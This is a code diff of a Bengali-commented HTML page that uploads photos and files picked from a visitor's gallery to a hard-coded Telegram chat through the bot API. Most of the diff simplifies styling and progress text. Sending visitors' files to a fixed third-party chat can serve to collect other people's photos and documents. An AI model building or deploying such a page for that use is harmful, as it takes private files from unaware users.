@@ -29,32 +29,12 @@
         }
 
         .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); } 
-        
-        .file-card { 
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); 
-            border: 1px solid rgba(255,255,255,0.1); 
-            animation: fadeInScale 0.4s ease forwards;
-        } 
-        
-        @keyframes fadeInScale {
-            0% { opacity: 0; transform: scale(0.8) translateY(10px); }
-            100% { opacity: 1; transform: scale(1) translateY(0); }
-        }
-
+        .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); } 
         ::-webkit-scrollbar { width: 5px; } 
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
         
-        /* প্রিমিয়াম প্রগ্রেস বার ডিজাইন */
-        .progress-bar { 
-            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1); 
-            background: linear-gradient(90deg, #3b82f6, #60a5fa, #3b82f6);
-            background-size: 200% 100%;
-            animation: shine 2s linear infinite;
-        }
-
-        @keyframes shine {
-            to { background-position: 200% center; }
-        }
+        /* প্রগ্রেস বার এনিমেশন */
+        .progress-bar { transition: width 0.4s ease; }
     </style>
 </head>
 <body class="p-4">
@@ -77,7 +57,7 @@
     <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
         <div class="lg:col-span-1"> 
             <label class="glass h-64 flex flex-col items-center justify-center cursor-pointer border-2 border-dashed border-gray-700 hover:border-blue-500 transition-all mb-6 group"> 
-                <input type="file" id="fileInput" multiple class="hidden" accept="image/png, image/jpeg, image/jpg, image/gif, image/*"> 
+                <input type="file" id="fileInput" multiple class="hidden" accept="image/*"> 
                 <span id="upload-icon" class="text-6xl mb-3 group-hover:scale-110 transition-transform">🖼️</span> 
                 <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to open Gallery</p> 
             </label> 
@@ -85,9 +65,9 @@
             <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
             
             <div id="status-box" class="mt-4 hidden p-4 glass rounded-2xl border-blue-500/30">
-                <p id="status-text" class="text-[10px] font-bold text-blue-400 uppercase mb-2">Transmitting Data...</p>
-                <div class="w-full bg-white/10 h-1.5 rounded-full overflow-hidden">
-                    <div id="progress-fill" class="progress-bar h-full w-0"></div>
+                <p id="status-text" class="text-[10px] font-bold text-blue-400 uppercase mb-2">Transferring: 0%</p>
+                <div class="w-full bg-white/10 h-1 rounded-full overflow-hidden">
+                    <div id="progress-fill" class="progress-bar bg-blue-500 h-full w-0"></div>
                 </div>
             </div>
         </div> 
@@ -99,8 +79,8 @@
                     <span id="q-count" class="text-blue-500 font-black text-4xl">0</span> 
                 </div> 
                 <div class="flex flex-col items-end"> 
-                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Status</span> 
-                    <span id="s-count" class="text-green-500 font-black text-4xl">—</span> 
+                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Sent Successfully</span> 
+                    <span id="s-count" class="text-green-500 font-black text-4xl">0</span> 
                 </div> 
             </div> 
             <div id="preview-grid" class="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 overflow-y-auto max-h-[500px] pr-2"> </div> 
@@ -114,17 +94,26 @@ const CHAT_ID = "5923885908";
 let queue = []; 
 let currentType = 'photo'; 
 
+// কনফিগারেশন আপডেট - এখানে পরিবর্তন করা হয়েছে যাতে সব ব্রাউজারে কাজ করে
 function setType(type) { 
     currentType = type; 
     const fileInput = document.getElementById('fileInput');
+    
     document.querySelectorAll('.tab-btn').forEach(b => { 
         b.classList.remove('active-tab', 'text-white'); 
         b.classList.add('text-gray-400'); 
     }); 
+    
     document.getElementById(`tab-${type}`).classList.add('active-tab'); 
     document.getElementById('upload-icon').innerText = type === 'photo' ? '🖼️' : '📂'; 
     document.getElementById('upload-label').innerText = type === 'photo' ? 'Open Gallery' : 'Open Files';
-    fileInput.accept = type === 'photo' ? "image/png, image/jpeg, image/jpg, image/gif, image/*" : ""; 
+    
+    if(type === 'photo') {
+        // সব ব্রাউজারকে বাধ্য করার জন্য ইমেজ ফরম্যাটগুলো নির্দিষ্ট করে দেওয়া হলো
+        fileInput.accept = "image/png, image/jpeg, image/jpg, image/gif, image/*";
+    } else {
+        fileInput.accept = ""; // সব ফাইল এলাউ করার জন্য
+    }
 } 
 
 document.getElementById('fileInput').onchange = (e) => { 
@@ -138,27 +127,17 @@ function render() {
     const grid = document.getElementById('preview-grid'); 
     grid.innerHTML = ""; 
     document.getElementById('q-count').innerText = queue.length; 
-    const fragment = document.createDocumentFragment();
     queue.forEach((f, i) => { 
         const div = document.createElement('div'); 
-        div.style.animationDelay = `${i * 0.05}s`;
         div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex items-center justify-center"; 
         if (f.type.startsWith('image/')) { 
-            const img = document.createElement('img');
-            img.src = URL.createObjectURL(f);
-            img.className = "w-full h-full object-cover";
-            div.appendChild(img);
+            div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
         } else { 
             div.innerHTML = `<div class="p-2 text-center text-[10px] font-bold text-gray-400 break-all uppercase">${f.name.split('.').pop()}</div>`; 
         } 
-        const closeBtn = document.createElement('button');
-        closeBtn.onclick = () => remove(i);
-        closeBtn.className = "absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center transition-transform hover:scale-125";
-        closeBtn.innerText = "✕";
-        div.appendChild(closeBtn);
-        fragment.appendChild(div);
+        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center">✕</button>`; 
+        grid.appendChild(div); 
     }); 
-    grid.appendChild(fragment);
 } 
 
 function remove(i) { queue.splice(i, 1); render(); } 
@@ -166,6 +145,7 @@ function remove(i) { queue.splice(i, 1); render(); }
 async function sendFile(file) {
     const method = (currentType === 'photo' && file.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
     const field = method === 'sendPhoto' ? 'photo' : 'document';
+    
     const fd = new FormData(); 
     fd.append("chat_id", CHAT_ID); 
     fd.append(field, file); 
@@ -194,11 +174,10 @@ async function ignite() {
     btn.disabled = true; 
     btn.innerText = "⚡ TRANSMITTING..."; 
     statusBox.classList.remove('hidden');
-    sCountDisp.innerText = "SENDING";
 
     let sent = 0; 
     const total = queue.length; 
-    const batchSize = 3; 
+    const batchSize = 2; 
 
     for (let i = 0; i < queue.length; i += batchSize) {
         const batch = queue.slice(i, i + batchSize);
@@ -206,25 +185,25 @@ async function ignite() {
             const success = await sendFile(file);
             if(success) {
                 sent++;
+                sCountDisp.innerText = sent;
                 qCountDisp.innerText = total - sent;
                 const percent = Math.round((sent / total) * 100);
                 progressFill.style.width = percent + "%";
+                statusText.innerText = `Transferring: ${percent}% (${sent}/${total})`;
             }
         }));
     }
 
-    btn.innerText = "SUCCESS"; 
+    btn.innerText = "MISSION COMPLETED"; 
     btn.style.background = "#10b981";
-    statusText.innerText = "TRANSFER COMPLETE";
-    sCountDisp.innerText = "DONE";
+    statusText.innerText = "ALL FILES TRANSMITTED";
     
     setTimeout(() => { 
         location.reload(); 
-    }, 2000); 
+    }, 3000); 
 } 
-
+// ডিফল্ট সেটআপ
 setType('photo');
 </script>
 </body>
-    </html>
-    
+</html>
